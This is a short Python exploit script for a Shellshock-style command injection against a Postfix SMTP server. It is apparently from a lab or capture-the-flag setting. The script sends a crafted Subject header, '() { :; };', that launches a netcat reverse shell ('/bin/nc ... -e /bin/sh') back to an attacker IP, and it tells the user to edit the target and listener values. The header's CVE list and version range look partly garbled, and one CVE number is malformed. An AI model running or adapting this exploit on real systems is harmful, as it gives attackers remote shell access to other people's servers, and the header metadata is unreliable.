#!/usr/bin/python3

###########################################################################################################
#                                                                                                         #
#   Exploit - https://github.com/s-kustm/bughunter1101/blob/master/postfix-smtpd-exploit.py               #
#   Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                                   #
#   CVE: 2014-7910, 2014-7227, 2014-7196, 2014-7169, 2014-62771, 2014-6271, 2014-3671, 2014-3659          #
#   Make some changes below on the <ATTACKER_IP> , <LISTENING_PORT> , <TARGET_IP> and <TARGET_PORT>       #
#                                                                                                         #
###########################################################################################################

import socket

payload = b"/bin/nc 10.10.14.28 4444 -e /bin/sh;" #Change HERE


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.settimeout(20)
sock.connect(("10.10.10.17",25)) #Change HERE
print(sock.recv(1024))
sock.send(b"helo test\r\n")
print(sock.recv(1024))
sock.send(b"Mail from: ysalaun@student.42.fr\r\n")
print(sock.recv(1024))
sock.send(b"rcpt to: salaun.yann@hotmail.fr\r\n")
print(sock.recv(1024))
sock.send(b"DATA\r\n")
print(sock.recv(1024))
sock.send(b"Subject:() { :; };" + payload + b"\r\n.\r\n")
print(sock.recv(1024))
sock.send(b"quit\r\n")
sock.close()

